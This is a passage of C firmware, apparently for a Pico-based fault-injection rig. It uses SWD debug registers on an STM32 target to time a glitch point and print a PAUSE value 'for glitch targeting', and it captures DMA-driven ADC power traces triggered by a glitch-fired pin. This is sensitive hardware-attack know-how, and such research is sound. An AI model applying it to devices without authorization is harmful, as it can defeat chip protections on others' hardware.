    if (!stage_a_ok) {
        uart_cli_printf("    Stage A failed: DHCSR=0x%08lX\r\n", dhcsr_poll);
        goto print_adc;
    }

    uint32_t cyccnt_first;
    swd_read_mem(0xE0001004, &cyccnt_first, 1);
    uart_cli_printf("    Watchdog fired after %lu cycles (%.2fms)\r\n",
                    cyccnt_first, (float)cyccnt_first / 8000.0f);

    // Stage B: Now halted at reset vector after watchdog.
    // Clear VC_CORERESET, set up DWT data watchpoint, zero CYCCNT, resume.
    uart_cli_send("[4b] Second boot (DWT watchpoint active)...\r\n");
    demcr_val = (1u << 24) | (1u << 10);  // TRCENA | VC_HARDERR (no VC_CORERESET)
    swd_write_mem(DEMCR, &demcr_val, 1);

    // Re-configure DWT (MATCHED may have been cleared by reset)
    swd_write_mem(0xE0001020, &watch_addr, 1);  // DWT_COMP0
    swd_write_mem(0xE0001024, &zero, 1);         // DWT_MASK0
    uint32_t dwt_func_b = 0x5;
    swd_write_mem(0xE0001028, &dwt_func_b, 1);  // DWT_FUNCTION0 = data read

    // Zero CYCCNT for fresh measurement
    swd_write_mem(0xE0001004, &zero, 1);

    // Resume for second boot
    swd_resume();
    uint64_t t0 = time_us_64();

    // Poll DHCSR — DWT data watchpoint should fire within microseconds
    uint32_t poll_count = 0;
    bool poll_halted = false;
    bool poll_reset = false;
    uint32_t window_us = 50000;  // 50ms

    while (time_us_64() - t0 < window_us) {
        swd_read_mem(DHCSR, &dhcsr_poll, 1);
        poll_count++;

        if (dhcsr_poll & (1u << 17)) {  // S_HALT — watchpoint fired!
            poll_halted = true;
            break;
        }
        if (dhcsr_poll & (1u << 25)) {  // S_RESET_ST — watchdog again
            poll_reset = true;
            break;
        }
    }

    uint64_t t_sample_end = time_us_64();
    uint32_t sample_us = (uint32_t)(t_sample_end - t0);

    // ADC not sampled in poll mode
    static uint16_t adc_buf[32768];
    uint32_t adc_count = 0;

    // === Step 5: Analyze results ===
    uart_cli_printf("[5] Poll done: %lu reads in %luus, DHCSR=0x%08lX\r\n",
                    poll_count, sample_us, dhcsr_poll);

    bool halted = poll_halted;
    bool lockup = (dhcsr_poll & (1u << 19)) != 0;

    if (halted) {
        uint32_t pc_now;
        swd_read_core_reg(15, &pc_now);
        uint32_t dwt_func_now, dwt_cyccnt;
        swd_read_mem(0xE0001028, &dwt_func_now, 1);  // DWT_FUNCTION0
        swd_read_mem(0xE0001004, &dwt_cyccnt, 1);    // DWT_CYCCNT
        bool dwt_matched = (dwt_func_now & (1u << 24)) != 0;
        uart_cli_printf("    PC=0x%08lX DWT_FUNC0=0x%08lX CYCCNT=%lu%s%s\r\n",
                        pc_now, dwt_func_now, dwt_cyccnt,
                        poll_reset ? " RESET" : "",
                        dwt_matched ? " DWT_MATCHED" : "");
    } else {
        uart_cli_printf("    NOT_HALTED%s\r\n", poll_reset ? " RESET" : "");
    }

    if (halted) {
        uint32_t cyccnt;
        swd_read_mem(0xE0001004, &cyccnt, 1);

        uint32_t pc;
        swd_read_core_reg(15, &pc);

        float time_ms = (float)cyccnt / 8000.0f;

        uart_cli_printf("\r\nDWT_CYCCNT: %lu cycles (%.2fms @ 8MHz HSI)\r\n", cyccnt, time_ms);
        uart_cli_printf("           ^^^^^^^^ use this as PAUSE for glitch targeting\r\n");
        uart_cli_printf("PC: 0x%08lX %s\r\n", pc,
                        (pc == bp_addr || pc == (bp_addr | 1)) ? "(MATCH)" : "(MISMATCH)");

        // Verify FPB still intact
        uint32_t fp_comp_after;
        swd_read_mem(0xE0002008, &fp_comp_after, 1);
        uart_cli_printf("FP_COMP0 after: 0x%08lX\r\n", fp_comp_after);

        // Pico equivalent: STM32 8MHz -> Pico 150MHz = x18.75
        uint32_t pause_pico = (uint32_t)((float)cyccnt * 18.75f);
        uart_cli_printf("\r\nPICO PAUSE equivalent: %lu cycles (150MHz)\r\n", pause_pico);
        uart_cli_printf("    SET PAUSE %lu\r\n", pause_pico);
    } else {
        uart_cli_send("WARNING: Core not halted — breakpoint may not have been reached yet\r\n");
        uart_cli_send("         Try increasing sample count or check breakpoint address\r\n");
    }

    // Cleanup FPB
    uint32_t fp_disable = 0x02;
    swd_write_mem(0xE0002000, &fp_disable, 1);
    swd_write_mem(0xE0002008, &zero, 1);

print_adc:
    // === ADC trace ===
    uart_cli_printf("\r\nADC shunt profile (%lu samples, %luus total, ~%luus/sample):\r\n",
                    adc_count, sample_us,
                    adc_count > 0 ? sample_us / adc_count : 0);

    // Find min/max
    uint16_t amin = 4095, amax = 0;
    for (uint32_t i = 0; i < adc_count; i++) {
        if (adc_buf[i] < amin) amin = adc_buf[i];
        if (adc_buf[i] > amax) amax = adc_buf[i];
    }
    uart_cli_printf("  ADC range: %u-%u (%.2fV-%.2fV)\r\n",
                    amin, amax,
                    amin * 3.3f / 4095.0f, amax * 3.3f / 4095.0f);

    // Raw sample dump — hex dump format, 16-bit LE samples, 16 bytes (8 samples) per line
    uint32_t total_bytes = adc_count * 2;
    uart_cli_printf("  RAW_START %lu %lu\r\n", adc_count, sample_us);  // sample_count sample_window_us
    uint8_t *p = (uint8_t *)adc_buf;
    for (uint32_t i = 0; i < total_bytes; i += 16) {
        uart_cli_printf("%06X:", i);
        for (uint32_t j = i; j < i + 16 && j < total_bytes; j++) {
            uart_cli_printf(" %02X", p[j]);
        }
        uart_cli_send("\r\n");
    }
    uart_cli_send("  RAW_END\r\n");

    swd_deinit();
    adc_select_input(ADC_POWER_CHAN);

    uart_cli_send("\r\n=== TIMING COMPLETE ===\r\n");
}

// ============================================================
// Background ADC trace capture (DMA + GLITCH_FIRED interrupt)
//
// TRACE START [samples] [pre%]  — start DMA circular capture
// TRACE STATUS                  — check state
// TRACE DUMP                    — output captured buffer
// TRACE STOP                    — abort
//
// Flow: DMA runs ADC into circular buffer continuously.
// GLITCH_FIRED rising edge ISR snapshots DMA position,
// then reconfigures DMA for exactly post_samples more transfers.
// DMA stops itself when count hits zero. No CPU involvement.
// ============================================================

#define TRACE_BUF_SAMPLES 4096
#define TRACE_BUF_BYTES   (TRACE_BUF_SAMPLES * 2)
#define TRACE_BUF_LOG2    13  // log2(8192)

static uint16_t __attribute__((aligned(TRACE_BUF_BYTES))) trace_buf[TRACE_BUF_SAMPLES];

typedef enum {
    TRACE_IDLE = 0,
    TRACE_RUNNING,      // DMA active, waiting for trigger
    TRACE_TRIGGERED,    // Trigger fired, DMA counting down post_samples
    TRACE_COMPLETE,     // DMA finished, buffer ready for dump
} trace_state_t;

static volatile trace_state_t trace_state = TRACE_IDLE;
static volatile uint32_t trace_trig_sample = 0;  // buffer index at trigger
static int trace_dma_chan = -1;
static uint32_t trace_post_samples = 0;
static uint32_t trace_total_samples = 0;
static uint32_t trace_pre_pct = 25;
static uint32_t trace_clkdiv = 0;

void trace_set_clkdiv(uint32_t div) {
    trace_clkdiv = div;
}

static uint64_t trace_start_us = 0;
static uint64_t trace_trig_us = 0;
static uint64_t trace_end_us = 0;

// GLITCH_FIRED rising edge ISR — trigger fired
static void trace_glitch_fired_isr(uint gpio, uint32_t events) {
    if (gpio != PIN_GLITCH_FIRED || trace_state != TRACE_RUNNING) return;

    // Snapshot DMA write position = trigger point in circular buffer
    uint32_t write_addr = (uint32_t)dma_channel_hw_addr(trace_dma_chan)->write_addr;
    trace_trig_sample = (write_addr - (uint32_t)trace_buf) / 2;
    trace_trig_us = time_us_64();

    // Abort DMA (register-level, ISR-safe), then restart with post_samples count.
    // Can't modify running counter on RP2350 — must abort+restart.
    dma_hw->abort = (1u << trace_dma_chan);
    while (dma_hw->abort & (1u << trace_dma_chan)) tight_loop_contents();

    // Drain any residual ADC FIFO samples
    while (!adc_fifo_is_empty()) adc_fifo_get();

    // Restart DMA: write continues from trigger point, post_samples transfers.
    // Writing al1_transfer_count_trig sets count AND triggers the channel.
    dma_hw->ch[trace_dma_chan].write_addr = write_addr;
    dma_hw->ch[trace_dma_chan].al1_transfer_count_trig = trace_post_samples;

    trace_state = TRACE_TRIGGERED;

    // Disable this interrupt — one-shot
    gpio_set_irq_enabled(PIN_GLITCH_FIRED, GPIO_IRQ_EDGE_RISE, false);
}

// DMA completion ISR — post_samples done
static void trace_dma_isr(void) {
    dma_channel_acknowledge_irq0(trace_dma_chan);
    adc_run(false);
    trace_end_us = time_us_64();
    trace_state = TRACE_COMPLETE;
}

void trace_start(uint32_t samples, uint32_t pre_pct_arg) {
    if (trace_state == TRACE_RUNNING || trace_state == TRACE_TRIGGERED) {
        uart_cli_send("ERROR: Trace already running (TRACE STOP first)\r\n");
        return;
    }

    if (samples == 0) samples = TRACE_BUF_SAMPLES;
    if (samples > TRACE_BUF_SAMPLES) samples = TRACE_BUF_SAMPLES;
    if (pre_pct_arg == 0) pre_pct_arg = 25;
    if (pre_pct_arg > 90) pre_pct_arg = 90;

    trace_total_samples = samples;
    trace_pre_pct = pre_pct_arg;
    trace_post_samples = samples - (samples * pre_pct_arg) / 100;
    trace_state = TRACE_IDLE;
    trace_trig_sample = 0;

    // Init ADC free-running with DMA
    adc_init();
    adc_gpio_init(ADC_SHUNT_PIN);
    adc_select_input(ADC_SHUNT_CHAN);
    adc_fifo_setup(true, true, 1, false, false);
    adc_set_clkdiv(trace_clkdiv);  // 0=~500ksps (~2us), 100=~5ksps (~200us)

    // Claim DMA channel
    trace_dma_chan = dma_claim_unused_channel(true);
    dma_channel_config cfg = dma_channel_get_default_config(trace_dma_chan);
    channel_config_set_transfer_data_size(&cfg, DMA_SIZE_16);
    channel_config_set_read_increment(&cfg, false);
    channel_config_set_write_increment(&cfg, true);
    channel_config_set_ring(&cfg, true, TRACE_BUF_LOG2);
    channel_config_set_dreq(&cfg, DREQ_ADC);

    dma_channel_configure(trace_dma_chan, &cfg,
        trace_buf,          // write
        &adc_hw->fifo,      // read
        0xFFFFFFFF,         // circular until ISR sets post count
        false);

    // Set up DMA completion interrupt (fires when transfer_count hits 0)
    dma_channel_set_irq0_enabled(trace_dma_chan, true);
    irq_set_exclusive_handler(DMA_IRQ_0, trace_dma_isr);
    irq_set_enabled(DMA_IRQ_0, true);

    // Set up GP22 rising edge interrupt (GLITCH_FIRED) via shared dispatcher
    gpio_irq_register(PIN_GLITCH_FIRED, GPIO_IRQ_EDGE_RISE, trace_glitch_fired_isr);

    // Start DMA then ADC
    dma_channel_start(trace_dma_chan);
    adc_run(true);
    trace_start_us = time_us_64();
    trace_state = TRACE_RUNNING;

    uart_cli_printf("OK: Trace started (%lu samples, %lu%% pre-trigger, %lu post)\r\n",
                    samples, pre_pct_arg, trace_post_samples);
    uart_cli_printf("  Waiting for trigger (GP%d rising edge)...\r\n", PIN_GLITCH_FIRED);
}

void trace_stop(void) {
    if (trace_state == TRACE_IDLE) {
        uart_cli_send("Trace not running\r\n");
        return;
    }
    adc_run(false);
    if (trace_dma_chan >= 0) {
        dma_channel_abort(trace_dma_chan);
        dma_channel_set_irq0_enabled(trace_dma_chan, false);
        dma_channel_unclaim(trace_dma_chan);
        trace_dma_chan = -1;
    }
    irq_set_enabled(DMA_IRQ_0, false);
    gpio_irq_unregister(PIN_GLITCH_FIRED, trace_glitch_fired_isr);
    adc_fifo_drain();
    adc_fifo_setup(false, false, 0, false, false);
    adc_select_input(ADC_POWER_CHAN);
    trace_state = TRACE_IDLE;
    uart_cli_send("OK: Trace reset\r\n");
}

void trace_status(void) {
    const char *state_str;
    switch (trace_state) {
        case TRACE_IDLE:      state_str = "IDLE"; break;
        case TRACE_RUNNING:   state_str = "RUNNING (waiting for trigger)"; break;
        case TRACE_TRIGGERED: state_str = "TRIGGERED (capturing post samples)"; break;
        case TRACE_COMPLETE:  state_str = "COMPLETE (ready for TRACE DUMP)"; break;
        default:              state_str = "UNKNOWN"; break;
    }
    uart_cli_printf("Trace: %s\r\n", state_str);
    if (trace_state >= TRACE_TRIGGERED) {
        uart_cli_printf("  Trigger at buffer index %lu\r\n", trace_trig_sample);
    }
    if (trace_state == TRACE_COMPLETE) {
        uint32_t total_us = (uint32_t)(trace_end_us - trace_start_us);
        uart_cli_printf("  Total time: %luus\r\n", total_us);
    }
}

void trace_dump(void) {
    if (trace_state != TRACE_COMPLETE) {
        uart_cli_printf("ERROR: Trace not complete (state: %d)\r\n", trace_state);
        return;
    }

    uint32_t pre_count = (trace_total_samples * trace_pre_pct) / 100;
    uint32_t post_count = trace_post_samples;

    // Check if buffer wrapped enough for full pre-trigger
    // DMA ran for at least (trigger_time - start_time) at ~500ksps
    uint32_t capture_us = (uint32_t)(trace_trig_us - trace_start_us);
    uint32_t est_pre_available = capture_us / 2;  // ~2us/sample
    if (pre_count > est_pre_available)
        pre_count = est_pre_available;
    if (pre_count > TRACE_BUF_SAMPLES - post_count)
        pre_count = TRACE_BUF_SAMPLES - post_count;

    uint32_t out_total = pre_count + post_count;
    uint32_t total_us = (uint32_t)(trace_end_us - trace_start_us);

    uart_cli_printf("Captured %lu samples (%lu pre + %lu post trigger)\r\n",
                    out_total, pre_count, post_count);
    uart_cli_printf("Trigger at sample %lu, ~2us/sample\r\n", pre_count);

    // Extract window from circular buffer — unwrap in-place to out_buf
    // Post-trigger data ends at: (trig_sample + post_count) & mask
    // Pre-trigger data starts at: (trig_sample - pre_count) & mask
    static uint16_t out_buf[32768];
    uint32_t mask = TRACE_BUF_SAMPLES - 1;
    for (uint32_t i = 0; i < out_total; i++) {
        uint32_t src = (trace_trig_sample - pre_count + i) & mask;
        out_buf[i] = trace_buf[src];
    }

    // Hex dump
    uint32_t total_bytes = out_total * 2;
    uart_cli_printf("  RAW_START %lu %lu %lu\r\n", out_total, total_us, pre_count);
    uint8_t *p = (uint8_t *)out_buf;
    for (uint32_t i = 0; i < total_bytes; i += 16) {
        uart_cli_printf("%06X:", i);
        for (uint32_t j = i; j < i + 16 && j < total_bytes; j++) {
            uart_cli_printf(" %02X", p[j]);
        }
        uart_cli_send("\r\n");
    }
    uart_cli_send("  RAW_END\r\n");

    uart_cli_send("=== TRACE COMPLETE ===\r\n");
}
